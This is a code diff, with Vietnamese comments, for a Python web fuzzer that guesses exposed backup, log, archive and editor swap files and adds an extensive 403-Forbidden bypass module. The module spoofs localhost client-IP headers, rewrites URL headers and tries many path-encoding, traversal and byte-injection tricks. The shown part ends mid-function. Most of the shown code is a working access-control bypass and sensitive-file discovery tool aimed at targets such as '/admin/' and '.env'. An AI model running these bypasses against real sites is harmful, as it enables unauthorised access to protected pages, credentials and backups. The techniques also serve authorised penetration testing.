@@ -95,7 +95,12 @@ DEFAULT_SUFFIXES = [
     ".dist", ".inc", ".log", ".swp", ".swo", "~", ".save", ".backup", ".copy", ".backup1", ".backup2",
     ".bak1", ".bak2", ".bkp", ".bkp1", ".bkp2", ".tmp1", ".tmp2", ".old1", ".old2", ".config", ".cfg", 
     ".ini" , ".backup.tar.gz", ".backup.zip", ".backup.tar", ".backup.tgz", ".backup.rar", ".conf",
-    "1", "2", "3", "bin", "json", "xml", ".bin", ".json", ".xml", ".htaccess", ".htpasswd", "_"
+    "1", "2", "3", "bin", "json", "xml", ".bin", ".json", ".xml", ".htaccess", ".htpasswd", "_", ".bat",
+    ".cmd", ".sh", ".zst", ".xz", ".lz", ".lzma", ".lzo", ".sz", ".zpaq", ".zst", ".tar.zst", ".tar.xz",
+    ".tar.lz", ".tar.lzma", ".tar.lzo", ".tar.sz", ".zpaq", ".tar.zpaq", "-bat", "-cmd", "-sh", "-zst", 
+    ".dev", ".staging", ".production", ".test", ".final", ".local", ".v1", ".v2", ".v1.0", ".v2.0", ".v1.1", ".v2.1",
+    "-version1", "-dev", "-staging", "-production", "-test", "-final", "-local", ".pro", ".release",
+    "-pro", "-release", ".pdb", ".backup_final", ".old_backup"
 ]
 
 # --- 3. PREFIX LIST ---
@@ -112,7 +117,9 @@ DEFAULT_INFIXES = [
     "-bk", "-backup", "-old", "_bak", "-bak"
     "_v1", "_v2", "v1", "v2", "_v1.0", "_v2.0", "_v1.1", "_v2.1", "-v1", "-v2", "_version1",
     "_temp", "_tmp", "_test", "_check", "_final",
-    "_backup_final", "_old_backup", "1", "2", "3"
+    "_backup_final", "_old_backup", "1", "2", "3",
+    "bat", "cmd", "sh", "zst", "xz", "lz", "lzma", "lzo", "sz", "zpaq", "tar.zst", "tar.xz", "tar.lz", 
+    "tar.lzma", "tar.lzo", "pdb"
 ]
 
 # --- 5. LOG FILENAMES (COMMON) ---
@@ -165,26 +172,90 @@ COMMON_LOG_FILENAMES = [
     "shop_errors.log", "shop_access.log", "shop_debug.log", "error_report.log", "error_report.txt"
 ]
 
+# --- 7. 403 BYPASS PAYLOADS ---
+BYPASS_HEADERS_LIST = [
+    {"X-Originating-IP": "127.0.0.1"},
+    {"X-Forwarded-For": "127.0.0.1"},
+    {"X-Forwarded": "127.0.0.1"},
+    {"Forwarded-For": "127.0.0.1"},
+    {"X-Remote-IP": "127.0.0.1"},
+    {"X-Remote-Addr": "127.0.0.1"},
+    {"X-Client-IP": "127.0.0.1"},
+    {"X-Real-IP": "127.0.0.1"},
+    {"Cluster-Client-IP": "127.0.0.1"},
+    {"X-Custom-IP-Authorization": "127.0.0.1"},
+    {"X-Host": "127.0.0.1"},
+    {"X-Forwarded-Host": "127.0.0.1"},
+    {"X-Forwarded-For": "localhost"},
+    {"X-Forwarded-Host": "localhost"},
+    {"Client-IP": "127.0.0.1"},
+    {"True-Client-IP": "127.0.0.1"},
+    {"X-Forwarded-For": "::1"},
+    {"X-Forwarded-Proto": "http"},
+    {"X-Forwarded-Scheme": "http"},
+    {"Base-Url": "127.0.0.1"},
+    {"Http-Url": "127.0.0.1"},
+    {"Proxy-Host": "127.0.0.1"},
+    {"Request-Uri": "127.0.0.1"},
+    {"X-ProxyUser-Ip": "127.0.0.1"},
+    {"X-Wap-Profile": "127.0.0.1"},
+]
+
+BYPASS_URL_SUFFIXES = [
+    "/", "//", "/.", "/./", "/..", "/../", "/%20", "/%09", "%20", "%09", 
+    "?", "??", "???", "&", "#", "%", "%23", "%2f", "%00", "%2e",
+    ";", "..;", "..;/", "..;%2f", "/..;/",".json", ".html", "?param=1",
+    "#", "/*", "/*.php", ".php", ".json", "/*/", "/.randomstring",
+    "..%00/", "%2e%2e/", "%252e%252e/", "%252f", "/%2e/", ".", ";%09", 
+    ";%20", "%3b", "%3b%20", "%3b%09", ";%09..", ";%09..;", "%3b%20%20..",
+    ";%2f..", ";%2f..;", "%3b%2f..", "\\", "?_is_admin=true", "?debug=true", "?is_admin=true", 
+    "?test=1", "?isAdmin=true" ,"?admin=true", "?view=admin", "?mode=admin", "?show=admin", "?_escaped_fragment_=",
+    "/...", "/..%00", "/..%01", "/..%0a", "/..%0d", "/..%09", "/~", "~", "/%20/",
+    "/%2e%2e/", "/%252e%252e/", "/%c0%af/", "/%e0%80%af",
+]
+
 def get_arguments():
     parser = argparse.ArgumentParser(
-        description="Backup Fuzzer v26.0 (Massive User-Agents)",
+        description="Backup Fuzzer v2.7.0 (Massive User-Agents)",
         formatter_class=argparse.RawTextHelpFormatter,  
         epilog="""EXAMPLES:
-  1. Scan single URL:
+  ---------------------------------------------------------------------------------
+  [BASIC USAGE]
+  1. Quick Scan (Single URL):
      python3 fuzzing_backup.py -u https://example.com/config.php
 
-  2. Scan with custom suffix and prefix:
-     python3 fuzzing_backup.py -u https://example.com/index.php -b .bak,.old -pre copy_
+  2. Scan List of URLs (High Perf):
+     python3 fuzzing_backup.py -L targets.txt -t 100 -o results.txt
 
-  3. Scan list of URLs with threads:
-     python3 fuzzing_backup.py -L urls.txt -t 50
+  ---------------------------------------------------------------------------------
+  [403 BYPASS & SECRET SCAN - POWERFUL]
+  3. Bypass 403 ONLY (Check 14 layers of bypass, No backup fuzzing):
+     python3 fuzzing_backup.py -u https://target.com/admin/ --only-bypass-403
+     python3 fuzzing_backup.py -L forbidden_urls.txt --only-bypass-403
 
-  4. Fuzzing with keyword FUZZ (requires wordlist):
-     python3 fuzzing_backup.py -u "https://example.com/FUZZ" -w wordlist.txt
-     python3 fuzzing_backup.py -L urls_with_fuzz.txt -w wordlist.txt
+  4. Fuzz Backup Files + Auto Bypass 403 if found:
+     python3 fuzzing_backup.py -u https://example.com/.env --bypass-403
 
-  5. Filter status and size:
-     python3 fuzzing_backup.py -u https://example.com/admin.php -mc 200 -S 1234,4096
+  ---------------------------------------------------------------------------------
+  [SMART SCANNING]
+  5. Scan Logs + Date Patterns (Find logs like access_2024.log):
+     python3 fuzzing_backup.py -u https://example.com/ --scan-logs --fuzz-date [1-12]-2024
+
+  6. Smart 404 Detection (Auto-remove Soft 404 pages):
+     python3 fuzzing_backup.py -L domains.txt --smart-404
+
+  ---------------------------------------------------------------------------------
+  [CUSTOM FUZZING]
+  7. Custom Wordlist using 'FUZZ' keyword:
+     python3 fuzzing_backup.py -u "https://example.com/FUZZ" -w common.txt
+
+  8. Custom Extensions & Prefixes:
+     python3 fuzzing_backup.py -u https://example.com/index.php -b .bak,.old,.swp -pre copy_,old_
+
+  ---------------------------------------------------------------------------------
+  [MISC]
+  9. Proxy (Burp Suite) + Random User-Agent:
+     python3 fuzzing_backup.py -u https://example.com/ -p "http://127.0.0.1:8080" --random-agent
 """
     )
     
@@ -203,9 +274,11 @@ def get_arguments():
     modes = parser.add_argument_group('MODES')
     modes.add_argument("--fuzz-domain", action="store_true", help="Kích hoạt fuzz tạo file backup dựa trên domain")
     modes.add_argument("--fuzz-year", dest="fuzz_year", nargs='?', const=0, type=int, help="Kích hoạt fuzz theo năm. Gõ số năm bắt đầu (Vd: --fuzz-year 2018)")
-    modes.add_argument("--fuzz-date", dest="fuzz_date", nargs='?', const="TODAY", help="Kích hoạt fuzz full ngày tháng. Cú pháp: [MM]-YYYY hoặc [StartMM-EndMM]-YYYY. VD: 12-2018, [1-7]-2018. Mặc định: TODAY")
+    modes.add_argument("--fuzz-date", dest="fuzz_date", nargs='?', const="TODAY", help="Kích hoạt fuzz full ngày tháng. Cú pháp: [MM]-YYYY, [StartMM-EndMM]-YYYY hoặc [StartMM-EndMM] (Không năm). VD: 12-2018, [1-7]-2018, [1-3]. Mặc định: TODAY")
     modes.add_argument("--scan-logs", dest="scan_logs", nargs='?', const="DEFAULT", help="Kích hoạt chế độ quét file logs. Có thể điền tên file log cụ thể để fuzz (VD: --scan-logs custom.log). Nếu để trống sẽ dùng list mặc định.")
     modes.add_argument("--smart-404", action="store_true", help="Tự động nhận diện Soft 404 để lọc False Positives")
+    modes.add_argument("--bypass-403", dest="bypass_403", action="store_true", help="Kích hoạt tự động Bypass 403 Forbidden bằng nhiều kỹ thuật (Header, URL manipulation)")
+    modes.add_argument("--only-bypass-403", dest="only_bypass_403", action="store_true", help="CHỈ chạy bypass 403 cho danh sách URL đầu vào (bỏ qua mọi fuzzing)")
     modes.add_argument("--no-suffix", action="store_true", help="Tắt quét nối đuôi (Suffix)")
     modes.add_argument("--no-prefix", action="store_true", help="Tắt quét tiền tố (Prefix)")
     modes.add_argument("--no-infix", action="store_true", help="Tắt quét chèn giữa (Infix)")
@@ -308,6 +381,8 @@ def generate_full_date_payloads(range_string):
             "%m-%d-%Y", # 01-25-2024
             "%d%m%y",   # 250124 (Short Year)
             "%y%m%d",   # 240125 (Short Year)
+            "%m%d",     # 0125 (MMDD)
+            "%d%m",     # 2501 (DDMM)
         ]
 
         for fmt in fmt_list:
@@ -327,7 +402,11 @@ def generate_full_date_payloads(range_string):
     match_single = re.match(r'^(\d{1,2})-(\d{4})$', range_string)
     # Case 3: 2024 (Full year)
     match_year = re.match(r'^(\d{4})$', range_string)
+    # Case 4: [1-7] (Month range, no year)
+    match_range_no_year = re.match(r'^\[(\d+)-(\d+)\]$', range_string)
     
+    only_short_date = False
+
     if match_range:
         start_m = int(match_range.group(1))
         end_m = int(match_range.group(2))
@@ -345,6 +424,14 @@ def generate_full_date_payloads(range_string):
         for m in range(1, 13):
             targets_month_year.append((m, y))
 
+    elif match_range_no_year:
+        start_m = int(match_range_no_year.group(1))
+        end_m = int(match_range_no_year.group(2))
+        y = 2024 # Use leap year to cover all dates
+        only_short_date = True
+        for m in range(start_m, end_m + 1):
+            if 1 <= m <= 12: targets_month_year.append((m, y))
+
     else:
         print(f"{Colors.RED}[!] Format date fuzz không hợp lệ: {range_string}{Colors.RESET}")
         return []
@@ -361,11 +448,15 @@ def generate_full_date_payloads(range_string):
                 continue
 
             # Standardized format list + prefixing for loop
-            fmt_list = [
-                "%Y%m%d", "%d%m%Y", "%Y-%m-%d", "%m%d%Y", 
-                "%Y-%d-%m", "%d-%m-%Y", "%m-%d-%Y",
-                "%d%m%y", "%y%m%d"
-            ]
+            if only_short_date:
+                fmt_list = ["%m%d", "%d%m"]
+            else:
+                fmt_list = [
+                    "%Y%m%d", "%d%m%Y", "%Y-%m-%d", "%m%d%Y", 
+                    "%Y-%d-%m", "%d-%m-%Y", "%m-%d-%Y",
+                    "%d%m%y", "%y%m%d",
+                    "%m%d", "%d%m"
+                ]
 
             for fmt in fmt_list:
                 val = dt.strftime(fmt)
@@ -401,8 +492,23 @@ def create_variations(filename, active_suffixes, active_infixes, active_prefixes
             variations.add(filename + d)
              # Infix style: config_2024.php
             if ext: variations.add(stem + d + ext)
+            
+            # Combine Suffix + Date (e.g., .bk.0210)
+            if active_suffixes:
+                for suffix in active_suffixes:
+                    variations.add(filename + suffix + d)
+                    if ext and suffix.startswith('.'):
+                        variations.add(stem + suffix + d)
 
     if active_suffixes or active_prefixes: variations.add('%23' + filename + '%23')
+    
+    # --- EDITOR SWAP FILES (Vim/Emacs) ---
+    # Vim: .filename.swp (Lưu ý dấu chấm ở đầu)
+    variations.add(f".{filename}.swp")
+    variations.add(f".{filename}.swo")
+    # Emacs: #filename#
+    variations.add(f"#{filename}#")
+    
     return list(variations)
 
 def generate_domain_payloads(target_url, active_suffixes, active_infixes, active_prefixes, date_payloads=None):
@@ -499,7 +605,113 @@ def generate_mutations(base_url, endpoint, active_suffixes, active_infixes, acti
     full_base = base_url + parent_path
 
     variations = create_variations(filename, active_suffixes, active_infixes, active_prefixes, date_payloads)
-    return [full_base + v for v in variations]
+    
+    payloads = [full_base + v for v in variations]
+
+    # --- PARENT DIRECTORY BACKUP ---
+    # Nếu file nằm trong folder (vd: admin/config.php), thử fuzz cả folder (vd: admin.zip, admin.rar)
+    if parts[:-1]: # Có thư mục cha
+        parent_dir_name = parts[-2] # Lấy tên thư mục cha gần nhất (vd: 'admin')
+        if parent_dir_name:
+            # Các đuôi nén thường dùng cho folder
+            dir_exts = ['.zip', '.rar', '.tar.gz', '.tgz', '.7z', '.bak', '.old', '.dev', '.backup']
+            # Đường dẫn tới thư mục cha (vd: https://site.com/admin/)
+            # Ta cần lùi lại 1 cấp để nối file nén vào (vd: https://site.com/ + admin.zip)
+            
+            # Xây dựng url base cấp cha
+            # parent_path đang là "admin/" -> parent_up_one là ""
+            parent_parts = parts[:-1]
+            if len(parent_parts) > 0:
+                grandparent_path = "/".join(parent_parts[:-1]) + "/" if len(parent_parts) > 1 else ""
+                grandparent_url = base_url + grandparent_path
+                
+                for ext in dir_exts:
+                     payloads.append(grandparent_url + parent_dir_name + ext)
+                     
+    return payloads
+
+def generate_path_context_payloads(target_url, active_suffixes):
+    """
+    Phân tích URL để tạo ra các wordlist thông minh dựa trên path và domain.
+    VD: https://sub.domain.com/Script/web/js/FUZZ
+    -> script_web.zip, web_js.rar, sub_domain_script.tar.gz...
+    """
+    try:
+        # Remove FUZZ to parse valid URL structure
+        clean_url = target_url.replace('FUZZ', '')
+        parsed = urllib.parse.urlparse(clean_url)
+        
+        tokens = []
+        
+        # 1. Domain Tokens
+        hostname = parsed.hostname
+        if hostname:
+            domain_parts = hostname.split('.')
+            # Bỏ qua các TLD và từ chung chung
+            tokens.extend([p for p in domain_parts if p and p not in ['com', 'vn', 'net', 'org', 'www', 'edu', 'gov']])
+            
+        # 2. Path Tokens
+        path = parsed.path
+        if path:
+            path_parts = [p for p in path.split('/') if p]
+            tokens.extend(path_parts)
+            
+        if not tokens: return []
+        
+        candidates = set()
+        
+        # 3. Basic Tokens (Original & Lowercase)
+        for t in tokens:
+            # Tự thêm .zip/rar cho từng token đơn
+            candidates.add(t)
+            candidates.add(t.lower())
+            
+        # 4. Combinations (Sequential Pairs & Triples)
+        # Sliding window size 2
+        for i in range(len(tokens) - 1):
+            p1 = tokens[i]
+            p2 = tokens[i+1]
+            # styles: p1_p2, p1-p2, p1.p2
+            candidates.add(f"{p1}_{p2}")
+            candidates.add(f"{p1}-{p2}")
+            candidates.add(f"{p1}.{p2}") # tạo ra kiểu sub.js, web.js
+            
+            # Lowercase versions
+            candidates.add(f"{p1.lower()}_{p2.lower()}")
+            candidates.add(f"{p1.lower()}.{p2.lower()}")
+
+        # Sliding window size 3 (e.g. sub_domain_script)
+        if len(tokens) >= 3:
+             for i in range(len(tokens) - 2):
+                p1, p2, p3 = tokens[i], tokens[i+1], tokens[i+2]
+                candidates.add(f"{p1}_{p2}_{p3}")
+                candidates.add(f"{p1.lower()}_{p2.lower()}_{p3.lower()}")
+
+        # 5. Full Path Joined
+        # Nếu path có > 1 phần tử (vd: Script/web/js) -> script_web_js
+        path_only_parts = [p for p in parsed.path.split('/') if p]
+        if len(path_only_parts) > 1:
+            candidates.add("_".join(path_only_parts))
+            candidates.add("_".join(path_only_parts).lower())
+            candidates.add("-".join(path_only_parts).lower())
+
+        # Extensions to append (Use Active Suffixes provided by user/default)
+        if not active_suffixes: 
+            # Fallback if empty
+            exts = ['.zip', '.rar', '.tar.gz', '.7z', '.sql', '.bak', '.old', '.tgz']
+        else:
+            exts = active_suffixes
+        
+        final_payloads = []
+        for c in candidates:
+            # Add extension to stem
+            for ext in exts:
+                final_payloads.append(c + ext)
+            
+        return list(set(final_payloads))
+        
+    except:
+        return []
 
 def get_color_for_status(status_code):
     if 200 <= status_code < 300: return Colors.GREEN
@@ -519,35 +731,710 @@ def save_to_file(filepath, content):
         except Exception as e:
             pass
 
+def extract_tokens(text):
+    """Trích xuất từ khóa để so sánh cấu trúc content"""
+    # Chỉ lấy chữ cái, bỏ qua số, độ dài >= 3
+    return set(re.findall(r'[a-zA-Z]{3,}', text))
+
+def calculate_jaccard(set1, set2):
+    """Tính độ tương đồng Jaccard giữa 2 set token"""
+    if not set1 and not set2: return 1.0
+    if not set1 or not set2: return 0.0
+    intersection = len(set1.intersection(set2))
+    union = len(set1.union(set2))
+    return intersection / union
+
 def detect_soft_404(session, base_url, headers, proxies):
     """
-    Gửi request đến URL không tồn tại để lấy signature của Soft 404
-    Trả về: (status_code, content_length) của trang 404
+    Phát hiện Soft 404 thông minh (Status, Redirect, Content Structure)
+    Trả về dict signature
     """
     try:
-        # Tạo random path kiểu UUID để chắc chắn 404
-        random_path = f"soft404_probing_{random.randint(100000, 999999)}"
-        probe_url = urllib.parse.urljoin(base_url, random_path)
+        # Probe 1
+        path1 = f"soft404_{random.randint(1000,9999)}"
+        url1 = urllib.parse.urljoin(base_url, path1)
+        r1 = session.get(url1, headers=headers, proxies=proxies, timeout=5, allow_redirects=False, verify=False)
         
-        # Thử 2 lần để chắc chắn ổn định
-        sizes = []
-        chk_status = 0
-        
-        for _ in range(2):
-            res = session.get(probe_url, headers=headers, proxies=proxies, timeout=5, allow_redirects=False, verify=False)
-            sizes.append(len(res.content))
-            chk_status = res.status_code
-        
-        # Nếu size ổn định (chênh lệch ít) -> lấy trung bình hoặc max
-        if abs(sizes[0] - sizes[1]) < 10: 
-            # print(f"{Colors.GREY}[*] Soft 404 Signature for {base_url}: Status={chk_status}, Size={sizes[0]}{Colors.RESET}")
-            return (chk_status, sizes[0]) # Trả về size của trang lỗi
-            
-    except:
-        pass
-    return (None, None)
+        # Probe 2
+        path2 = f"soft404_{random.randint(1000, 9999)}"
+        url2 = urllib.parse.urljoin(base_url, path2)
+        r2 = session.get(url2, headers=headers, proxies=proxies, timeout=5, allow_redirects=False, verify=False)
 
-def check_url(session, url, base_headers, proxies, filters, use_random_agent, delay, match_codes, filter_codes, output_file, timeout, soft_404_signatures=None, retry_count=0):
+        # 1. Check Stability
+        if r1.status_code != r2.status_code: return None
+        
+        sig = {
+            'status': r1.status_code,
+            'avg_size': (len(r1.content) + len(r2.content)) / 2,
+            'is_redirect': False,
+            'location': None,
+            'tokens': extract_tokens(r1.text)
+        }
+
+        # 2. Check Redirect (3xx)
+        if 300 <= r1.status_code < 400:
+            sig['is_redirect'] = True
+            sig['location'] = r1.headers.get('Location', '')
+        
+        return sig
+
+    except:
+        return None
+
+def attempt_bypass_403(session, url, base_headers, proxies, timeout, soft_404_signatures=None):
+    """
+    Thử nghiệm các kỹ thuật bypass 403 cơ bản khi gặp status 403
+    """
+    success_msg = []
+    
+    # Pre-calculate base for soft 404 check
+    parsed = None
+    base_domain = ""
+    try:
+        parsed = urllib.parse.urlparse(url)
+        path = parsed.path
+        base_domain = f"{parsed.scheme}://{parsed.netloc}"
+    except:
+        path = ""
+
+    def is_soft_404(res_obj):
+        # Nếu không có signature thì ko check được, coi là Valid
+        if not soft_404_signatures or base_domain not in soft_404_signatures:
+            return False
+            
+        sig = soft_404_signatures[base_domain]
+        # 1. Check Size gần giống Soft 404 gốc
+        if abs(len(res_obj.content) - sig['avg_size']) < (sig['avg_size'] * 0.1 + 50):
+            return True
+            
+        # 2. Check Redirect Location (nếu 200 OK thì ko check location, nhưng check content HTML title?)
+        # 3. Check Jaccard (Advanced)
+        if len(res_obj.text) > 100:
+            curr_tokens = extract_tokens(res_obj.text)
+            sim = calculate_jaccard(sig['tokens'], curr_tokens)
+            if sim > 0.85: return True
+            
+        return False
+
+    # 1. Header Manipulation (Static IPs & Localhost)
+    for header in BYPASS_HEADERS_LIST:
+        try:
+            headers = base_headers.copy()
+            headers.update(header)
+            res = session.get(url, headers=headers, proxies=proxies, timeout=timeout, allow_redirects=False, verify=False)
+            if res.status_code == 200 and not is_soft_404(res):
+                header_str = str(header).replace('{', '').replace('}', '').replace("'", "")
+                success_msg.append(f"{Colors.GREEN}[Header: {header_str}]{Colors.RESET}")
+        except: pass
+
+    # 1.1 Dynamic Headers (Path based)
+    # X-Original-URL & X-Rewrite-URL
+    if path:
+        dynamic_headers = [
+            {"X-Original-URL": path},
+            {"X-Rewrite-URL": path},
+            {"X-Custom-IP-Authorization": "127.0.0.1"}
+        ]
+        for header in dynamic_headers:
+            try:
+                headers = base_headers.copy()
+                headers.update(header)
+                res = session.get(url, headers=headers, proxies=proxies, timeout=timeout, allow_redirects=False, verify=False)
+                if res.status_code == 200 and not is_soft_404(res):
+                    header_str = str(header).replace('{', '').replace('}', '').replace("'", "")
+                    success_msg.append(f"{Colors.GREEN}[Header: {header_str}]{Colors.RESET}")
+            except: pass
+
+
+    # 2. URL Manipluation (Suffixes)
+    for suffix in BYPASS_URL_SUFFIXES:
+        try:
+            bypass_url = url + suffix
+            # Force URL raw để tránh requests/urllib3 tự động normalize path (../ -> /)
+            req = requests.Request('GET', bypass_url, headers=base_headers)
+            prepped = session.prepare_request(req)
+            prepped.url = bypass_url 
+            
+            res = session.send(prepped, proxies=proxies, timeout=timeout, allow_redirects=False, verify=False)
+            if res.status_code == 200 and not is_soft_404(res):
+                 success_msg.append(f"{Colors.GREEN}[URL: {suffix}]{Colors.RESET}")
+        except: pass
+    
+    # 3. Path Traversal Trick (/admin/./)
+    if url.endswith('/'):
+         tricks = ['.;/', './', '%2e/']
+         for t in tricks:
+             try:
+                 bypass_url = url + t
+                 req = requests.Request('GET', bypass_url, headers=base_headers)
+                 prepped = session.prepare_request(req)
+                 prepped.url = bypass_url
+                 
+                 res = session.send(prepped, proxies=proxies, timeout=timeout, allow_redirects=False, verify=False)
+                 if res.status_code == 200 and not is_soft_404(res):
+                     success_msg.append(f"{Colors.GREEN}[Trick: {t}]{Colors.RESET}")
+             except: pass
+
+    # 4. Deep Path Injection (Multi-level)
+    # Thử inject vào TẤT CẢ các tầng thư mục của URL
+    try:
+        parsed = urllib.parse.urlparse(url)
+        path = parsed.path
+        if not path: path = "/"
+        
+        segments = path.split('/') # ['','test','file']
+        
+        # Chỉ chạy nếu có path thực sự (segments > 1)
+        if len(segments) > 1:
+            infixes = [
+                "%09", "%20", ";", ".", "./", ".;", "..;", ";/..;", "..;/", "%2e", "/", "//", "/./",
+                "%252e", "%u002e", "///", "\\", "/../", "/.../"
+            ]
+            base_origin = f"{parsed.scheme}://{parsed.netloc}"
+
+            # Duyệt qua từng segment (bỏ qua cái đầu tiên rỗng)
+            # i chạy từ 1 đến hết list segments
+            # Vd: ['', 'a', 'b'] -> i=1 ('a'), i=2 ('b')
+            for i in range(1, len(segments)):
+                for infix in infixes:
+                    # Case 1: Folder Form (/INFIX/)
+                    # /a/b -> level 1: /INFIX/a/b
+                    try:
+                        new_segs = segments[:i] + [infix] + segments[i:]
+                        mutated_path = "/".join(new_segs)
+                        
+                        bypass_url = base_origin + mutated_path
+                        
+                        req = requests.Request('GET', bypass_url, headers=base_headers)
+                        prepped = session.prepare_request(req)
+                        prepped.url = bypass_url 
+                        res = session.send(prepped, proxies=proxies, timeout=timeout, allow_redirects=False, verify=False)
+                        
+                        if res.status_code == 200 and not is_soft_404(res):
+                            success_msg.append(f"{Colors.GREEN}[Deep Infix: .../{infix}/...]{Colors.RESET}")
+                    except: pass
+                    
+                    # Case 2: Sticky Form (/;name)
+                    # /a/b -> level 1: /;a/b
+                    if segments[i]: # Chỉ inject nếu segment có tên
+                        try:
+                             mutated_segs = segments[:]
+                             mutated_segs[i] = infix + segments[i]
+                             mutated_path = "/".join(mutated_segs)
+                             
+                             bypass_url = base_origin + mutated_path
+                             
+                             req = requests.Request('GET', bypass_url, headers=base_headers)
+                             prepped = session.prepare_request(req)
+                             prepped.url = bypass_url 
+                             res = session.send(prepped, proxies=proxies, timeout=timeout, allow_redirects=False, verify=False)
+                             
+                             if res.status_code == 200 and not is_soft_404(res):
+                                 success_msg.append(f"{Colors.GREEN}[Deep Sticky: .../{infix}{segments[i]}]{Colors.RESET}")
+                        except: pass
+    except: pass
+
+    # 5. Path Obfuscation (URL Encoding) - [NEW]
+    # Slashes -> %2f, %252f, %u002f
+    # Dots -> %2e, %252e 
+    try:
+        parsed = urllib.parse.urlparse(url)
+        path = parsed.path
+        if not path: path = "/"
+        
+        base_origin = f"{parsed.scheme}://{parsed.netloc}"
+        enc_variations = []
+
+        # Chỉ encode nếu path có slash (ngoài root)
+        if len(path) > 1:
+            # 1. Encode các slash phân tách (trừ slash đầu tiên)
+            # /path/to/file -> /path%2fto%2ffile
+            clean_path = path[1:] if path.startswith('/') else path
+            
+            # Mẫu thay thế
+            replacements = {
+                '/': ['%2f', '%252f', '%u002f', '%ef%bc%8f'], # Slashes
+                # '.': ['%2e', '%252e', '%u002e'] # Dots (nếu muốn)
+            }
+            
+            for char, repls in replacements.items():
+                if char in clean_path:
+                    for r in repls:
+                         # Replacement toàn bộ
+                         enc_path = "/" + clean_path.replace(char, r)
+                         enc_variations.append(enc_path)
+                         
+                         # Replacement từng phần (chỉ cái cuối cùng) - Hữu ích để bypass mod_security chặn filename
+                         # /admin/config.php -> /admin%2fconfig.php
+                         if char == '/':
+                             base_p, file_p = clean_path.rsplit(char, 1)
+                             enc_path_last = "/" + base_p + r + file_p
+                             enc_variations.append(enc_path_last)
+
+            # 2. Case Specical: /test%2fdangky-agr...
+            # Người dùng yêu cầu case encode cụ thể ở 1 vị trí. 
+            # Đã bao gồm trong logic trên (encode toàn bộ hoặc encode cái cuối).
+            
+            # Thử gửi
+            for v_path in list(set(enc_variations)):
+                 try:
+                     bypass_url = base_origin + v_path
+                     req = requests.Request('GET', bypass_url, headers=base_headers)
+                     prepped = session.prepare_request(req)
+                     prepped.url = bypass_url 
+                     
+                     res = session.send(prepped, proxies=proxies, timeout=timeout, allow_redirects=False, verify=False)
+                     if res.status_code == 200 and not is_soft_404(res):
+                             success_msg.append(f"{Colors.GREEN}[Encode: {v_path}]{Colors.RESET}")
+                 except: pass
+    except: pass
+    
+    # 6. Character Encoding (Within segments) - [NEW]
+    # e.g., /admin -> /%61dmin, /admin.php -> /admin%2ephp
+    try:
+        parsed = urllib.parse.urlparse(url)
+        path = parsed.path
+        base_origin = f"{parsed.scheme}://{parsed.netloc}"
+        
+        # Lấy filename cuối cùng
+        path_no_slash = path.rstrip('/')
+        if not path_no_slash: path_no_slash = ""
+
+        if len(path_no_slash) > 1:
+            base_path_dir = path_no_slash.rsplit('/', 1)[0]
+            if base_path_dir == "": base_path_dir = "/" # Nếu là root file /abc
+            elif not base_path_dir.endswith('/'): base_path_dir += "/"
+
+            filename = path_no_slash.split('/')[-1]
+            
+            char_variations = []
+            
+            if filename:
+                # 0. Case Sensitivity (Upper/Lower) - [NEW]
+                # /SECRET
+                char_variations.append(base_path_dir + filename.upper())
+                # /Secret (Title case)
+                char_variations.append(base_path_dir + filename.capitalize())
+
+                # 1. Encode dot (.)
+                if '.' in filename:
+                    # file.php -> file%2ephp
+                    var1 = base_path_dir + filename.replace('.', '%2e')
+                    char_variations.append(var1)
+                    
+                    # file.php -> file%252ephp (Double encode)
+                    var2 = base_path_dir + filename.replace('.', '%252e')
+                    char_variations.append(var2)
+
+                # 2. Encode first char
+                # admin -> %61dmin
+                first_char = filename[0]
+                if first_char.isalnum():
+                    hex_val = hex(ord(first_char))[2:].upper()
+                    
+                    # Single encode: %61
+                    var3 = base_path_dir + f"%{hex_val}" + filename[1:]
+                    char_variations.append(var3)
+                    
+                    # Double encode first char: %2561
+                    var3_dbl = base_path_dir + f"%25{hex_val}" + filename[1:]
+                    char_variations.append(var3_dbl)
+
+                # 3. Encode whole filename
+                # admin -> %61%64%6d%69%6e
+                full_enc = "".join([f"%{hex(ord(c))[2:].upper()}" for c in filename])
+                var4 = base_path_dir + full_enc
+                char_variations.append(var4)
+                
+                # 4. Leading Slash variations (Special Encoding)
+                # /admin -> /%2fadmin, /%2f%2fadmin
+                var_slash1 = base_path_dir + "%2f" + filename
+                char_variations.append(var_slash1)
+                 
+                var_slash2 = base_path_dir + "%2f%2f" + filename
+                char_variations.append(var_slash2)
+
+                # 5. Unicode Path Variations - [NEW]
+                # /%ef%bc%8fpath
+                var_uni1 = base_path_dir + "%ef%bc%8f" + filename
+                char_variations.append(var_uni1)
+                
+                # Send Requests for Character Encoding
+                for v_path in list(set(char_variations)):
+                    try:
+                        bypass_url = base_origin + v_path
+                        req = requests.Request('GET', bypass_url, headers=base_headers)
+                        prepped = session.prepare_request(req)
+                        prepped.url = bypass_url 
+                        
+                        res = session.send(prepped, proxies=proxies, timeout=timeout, allow_redirects=False, verify=False)
+                        
+                        if res.status_code == 200 and not is_soft_404(res):
+                            success_msg.append(f"{Colors.GREEN}[Char Encode: {v_path}]{Colors.RESET}")
+                    except: pass
+    except: pass  
+
+    # 7. Protocol/Parser Fuzzing (Byte Injection) - [NEW]
+    # Inserts specific ASCII/High-Byte characters at path boundaries
+    # Based on technique: /%xx/admin, /admin%xx/
+    try:
+        parsed = urllib.parse.urlparse(url)
+        path = parsed.path
+        if not path or path == "/": path = ""
+        base_origin = f"{parsed.scheme}://{parsed.netloc}"
+        
+        # Target Critical Bytes:
+        # 0x00-0x1F (Control Chars), 0x7F-0xFF (High Bytes), and some specials
+        # Limited set for performance, can be expanded to range(256) if needed
+        critical_bytes = [0x00, 0x09, 0x0a, 0x0d, 0x85, 0xa0, 0x0b, 0x0c] 
+        # Add quick high-byte check range (e.g. 0x80 to 0x85)
+        critical_bytes.extend(range(0x80, 0x86))
+        
+        segments = path.strip('/').split('/')
+        segments = [s for s in segments if s]
+        
+        if segments:
+            for b in critical_bytes:
+                hex_char = f"%{b:02x}"
+                variations = []
+
+                # Strategy A: Trailing Suffix Injection (/admin%xx)
+                # /admin/dashboard -> /admin/dashboard%85
+                var_suffix = path + hex_char
+                variations.append(var_suffix)
+                
+                # Strategy B: Segment Sandwich (Intermediate Injection)
+                # /admin/dashboard -> /admin%85/dashboard
+                # /admin/dashboard -> /admin/dashboard%85 (Covered above)
+                if len(segments) > 1:
+                     # Inject at first segment boundary
+                     # /admin/dash -> /admin%85/dash
+                     new_path_1 = "/" + segments[0] + hex_char + "/" + "/".join(segments[1:])
+                     variations.append(new_path_1)
+
